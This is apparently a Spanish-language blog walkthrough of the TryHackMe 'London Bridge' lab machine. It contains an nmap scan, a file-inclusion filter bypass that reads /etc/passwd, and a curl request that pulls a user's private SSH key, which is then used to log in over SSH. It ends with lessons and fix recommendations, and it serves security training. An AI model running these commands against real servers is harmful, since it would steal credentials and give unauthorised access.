---
title: "TryHackMe: The London Bridge - Walkthrough"
description: "De LFI a root mediante exposición de claves SSH"
pubDate: "2024-06-20"
heroImage: "/assets/thm-london.webp"
tags: ["tryhackme", "lfi", "pentesting"]
---

<!-- ************************** -->
<!-- SECCIÓN DE INTRODUCCIÓN -->
<!-- ************************** -->

![Banner de la máquina](/assets/london-bridge-cover.webp)

Esta máquina **Linux (dificultad media)** explota:

- Local File Inclusion (LFI)
- Exposición de claves SSH
- Escalada vía misconfiguración SUDO

---

<!-- ************************** -->
<!-- SECCIÓN DE RECONOCIMIENTO -->
<!-- ************************** -->

## 🔍 1. Reconocimiento Inicial

### Escaneo Nmap
```bash
nmap -sV -sC -p- 10.10.154.180 -oN scans/nmap_initial
```

**Resultados clave**:
```markdown
PORT     STATE SERVICE    VERSION
8080/tcp open  http      Node.js Express
22/tcp   open  ssh       OpenSSH 7.6p1
```

---

<!-- ************************** -->
<!-- SECCIÓN DE EXPLOTACIÓN -->
<!-- ************************** -->

## 💣 2. Explotación de LFI

### Bypass de filtros
```diff
- Bloqueado: /etc/passwd
+ Funciona: 127.1:80/etc/passwd
```

### Obtención de clave SSH
```bash
curl -X POST 'http://10.10.154.180:8080/view_image' \
-d 'image_url=127.1:80/home/beth/.ssh/id_rsa' > beth_rsa
```

---

<!-- ************************** -->
<!-- SECCIÓN POST-EXPLOTACIÓN -->
<!-- ************************** -->

## 🚀 3. Post-Explotación

### Conexión SSH
```bash
chmod 600 beth_rsa
ssh -i beth_rsa beth@10.10.154.180
```

### Escalada a root
```bash
sudo -l  # Verificar permisos
```

---

<!-- ************************** -->
<!-- SECCIÓN DE CONCLUSIÓN -->
<!-- ************************** -->

## 🔐 4. Lecciones Aprendidas

### Vulnerabilidades explotadas
```markdown
1. LFI → Lectura arbitraria
2. SSH Key Exposure → Acceso inicial
3. SUDO Misconfig → Escalada
```

### Recomendaciones
```markdown
- [ ] Validación estricta de inputs
- [ ] Restringir ~/.ssh/
- [ ] Auditoría SUDO
```

<!-- ************************** -->
<!-- BLOQUE DE CÓDIGO FINAL -->
<!-- ************************** -->
